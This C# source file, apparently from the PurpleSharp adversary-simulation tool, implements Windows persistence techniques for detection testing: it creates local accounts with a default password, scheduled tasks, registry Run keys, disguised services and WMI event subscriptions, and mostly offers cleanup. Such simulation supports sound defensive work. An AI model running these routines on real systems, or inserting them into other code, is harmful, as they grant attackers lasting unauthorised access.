using System;
using System.Management;
using System.Threading;
using PurpleSharp.Lib;


namespace PurpleSharp.Simulations
{
    class Persistence
    {
        public static void CreateLocalAccountApi(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1136.001");
            logger.TimestampInfo("Using the Win32 API NetUserAdd function to execute the technique");
            string user = playbookTask.user;
            bool cleanup = playbookTask.cleanup;
            string password = playbookTask.password;
            if (user == null)
            {
                user = "haxor";
            }

            if (password == null)
            {
                password = "Passw0rd123El7";
            }
            try
            {
                PersistenceHelper.CreateUserApi(user, password, logger, cleanup);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void CreateLocalAccountCmd(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1136.001");
            logger.TimestampInfo("Using the command line to execute the technique");
            string user = playbookTask.user;
            string password = playbookTask.password;
            bool cleanup = playbookTask.cleanup;
            if (user == null)
            {
                user = "haxor";
            }

            if (password == null)
            {
                password = "Passw0rd123El7";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format("net user {0} {1} /add", user, password), logger);
                Thread.Sleep(2000);
                if (cleanup)
                {
                    ExecutionHelper.StartProcessApi("", String.Format("net user {0} /delete", user), logger);
                }
                else
                {
                    logger.TimestampInfo(String.Format("The created local user {0} was not deleted as part of the simulation", user));
                }


                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void CreateScheduledTaskCmd(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1053.005");
            logger.TimestampInfo("Using the command line to execute the technique");
            string taskPath = playbookTask.taskPath;
            string taskName = playbookTask.taskName;
            bool cleanup = playbookTask.cleanup;
            if (taskPath == "")
            {
                taskPath = @"C:\Windows\Temp\xyz12345.exe";
            }
            if (taskName == "")
            {
                taskName = "BadScheduledTask";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format(@"SCHTASKS /CREATE /SC DAILY /TN {0} /TR ""{1}"" /ST 13:00", taskName, taskPath), logger);
                if (cleanup)
                {
                    ExecutionHelper.StartProcessApi("", String.Format(@"SCHTASKS /DELETE /F /TN {0}", taskName), logger);
                    Thread.Sleep(3000);
                }
                else
                {
                    logger.TimestampInfo(@"The created Scheduled Task " + taskName + " was not deleted as part of the simulation");
                }
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }
        public static void CreateRegistryRunKeyNET(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1547.001");
            logger.TimestampInfo("Using the Microsoft.Win32 .NET namespace to execute the technique");
            string regPath = playbookTask.regPath;
            string regKey = playbookTask.regkey;
            string regValue = playbookTask.regvalue;
            bool cleanup = playbookTask.cleanup;
            if (regPath == null)
            {
                regPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            }

            if (regKey == null)
            {
                regKey = "BadApp";
            }

            if (regValue == null)
            {
                regValue = @"C:\Windows\Temp\xyz123456.exe";
            }
            try
            {
                PersistenceHelper.RegistryRunKey(logger, regPath,regKey, regValue,cleanup);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
            
        }

        public static void CreateRegistryRunKeyCmd(string log,PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1547.001");
            logger.TimestampInfo("Using the command line to execute the technique");
            string regPath = playbookTask.regPath;
            string regKey = playbookTask.regkey;
            string regValue = playbookTask.regvalue;
            bool cleanup = playbookTask.cleanup;
            if (regPath == null)
            {
                regPath = @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            }
            if (regKey == null)
            {
                regKey = "BadApp";
            }

            if (regValue == null)
            {
                regValue = @"C:\Windows\Temp\xyz123456.exe";
            }

            try
            {

                ExecutionHelper.StartProcessApi("", String.Format(@"REG ADD {0} /V {1} /t REG_SZ /F /D {2}", regPath, regKey, regValue), logger);
                if (cleanup)
                {
                    Thread.Sleep(3000);
                    ExecutionHelper.StartProcessApi("", String.Format(@"REG DELETE {0} /V {1} /F", regPath, regKey), logger);
                }
                else
                {
                    logger.TimestampInfo(@"The created RegKey : "+ regPath + " "+ regKey + " was not deleted as part of the simulation");
                }
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }

            
        }

        public static void CreateWindowsServiceApi(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1543.003");
            logger.TimestampInfo("Using the Win32 API CreateService function to execute the technique");
            string servicePath = playbookTask.servicePath;
            string serviceName = playbookTask.serviceName;
            string serviceDisplayName = playbookTask.serviceDisplayName;
            bool cleanup = playbookTask.cleanup;
            if (servicePath == null)
            {
                servicePath = @"C:\Windows\Temp\superlegit.exe"; 
            }
            if (serviceName == null)
            {
                serviceName = "UpdaterService";
            }
            if (serviceDisplayName == null)
            {
                serviceDisplayName = "Super Legit Update Service";
            }
            try
            {
                PersistenceHelper.CreateServiceApi(serviceName, serviceDisplayName, servicePath, cleanup, logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }
        public static void CreateWindowsServiceCmd(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1543.003");
            logger.TimestampInfo("Using the command line to execute the technique");
            string serviceName = playbookTask.serviceName;
            string servicePath = playbookTask.servicePath;
            bool cleanup = playbookTask.cleanup;
            if (servicePath == null)
            {
                servicePath = @"C:\Windows\Temp\superlegit.exe"; 
            }
            if (serviceName == null)
            {
                serviceName = "UpdaterService";
            }
            try
            {
                ExecutionHelper.StartProcessApi("", String.Format(@"sc create {0} binpath= {1} type= own start= auto", serviceName, servicePath), logger);
                Thread.Sleep(3000);
                if (cleanup) ExecutionHelper.StartProcessApi("", String.Format(@"sc delete {0}", serviceName), logger);
                else logger.TimestampInfo(String.Format("The created Service: {0} ImagePath: {1} was not deleted as part of the simulation", serviceName, servicePath));
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }  
        }

        public static void WMIEventSubscription(string log, PlaybookTask playbookTask)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1546.003");
            logger.TimestampInfo("Using the System.Management .NEt namespace to execute the technique");
            string wmiSubscription = playbookTask.wmiSubscription;
            string targetInstance = playbookTask.targetInstance;
            string filterQuery = playbookTask.filterQuery;
            string consumerCommandLine = playbookTask.consumerCommandLine;
            bool cleanup = playbookTask.cleanup;
            if (wmiSubscription == null)
            {
                wmiSubscription = "MaliciousWmiSubscription";
            }

            if (targetInstance == null)
            {
                targetInstance = "notepad.exe";
            }
            if (filterQuery == null)
            {
                filterQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " + "WHERE TargetInstance ISA \"Win32_Process\" " + "AND TargetInstance.Name = " + "\"" + targetInstance + "\"";
            }

            if (consumerCommandLine == null)
            {
                consumerCommandLine = "powershell.exe -nop -c calc";
            }
            //string vbscript64 = "<INSIDE base64 encoded VBS here>";
            //string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));
            try
            {
                ManagementObject EventFilter = null;
                ManagementObject EventConsumer = null;
                ManagementObject myBinder = null;

                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                WqlEventQuery myEventQuery = new WqlEventQuery(filterQuery);
                
                EventFilter = wmiEventFilter.CreateInstance();
                EventFilter["Name"] = wmiSubscription;
                EventFilter["Query"] = myEventQuery.QueryString;
                EventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                EventFilter["EventNameSpace"] = @"\root\cimv2";
                EventFilter.Put();
                logger.TimestampInfo(String.Format("EventFilter '{0}' created.", wmiSubscription));

                EventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();
                EventConsumer["Name"] = wmiSubscription;
                EventConsumer["CommandLineTemplate"] = consumerCommandLine;
                EventConsumer.Put();
                logger.TimestampInfo(String.Format("CommandLineEventConnsumer '{0}' - {1} created.", wmiSubscription, consumerCommandLine));

                /*
                EventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();
                EventConsumer["Name"] = "BadActiveScriptEventConsumer";
                EventConsumer["ScriptingEngine"] = "VBScript";
                EventConsumer["ScriptText"] = vbscript;
                EventConsumer.Put();
                */
                myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
                myBinder["Filter"] = EventFilter.Path.RelativePath;
                myBinder["Consumer"] = EventConsumer.Path.RelativePath;
                myBinder.Put();

                logger.TimestampInfo("FilterToConsumerBinding created.");

                if (cleanup)
                {
                    Thread.Sleep(3 * 1000);
                    EventFilter.Delete();
                    EventConsumer.Delete();
                    myBinder.Delete();
                    logger.TimestampInfo("WMI Subscription Deleted");
                }
                else
                {
                    logger.TimestampInfo("The created WMI Subscription was not deleted as part of the simulation");
                }
                
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
                
            } 
        }
    }
}
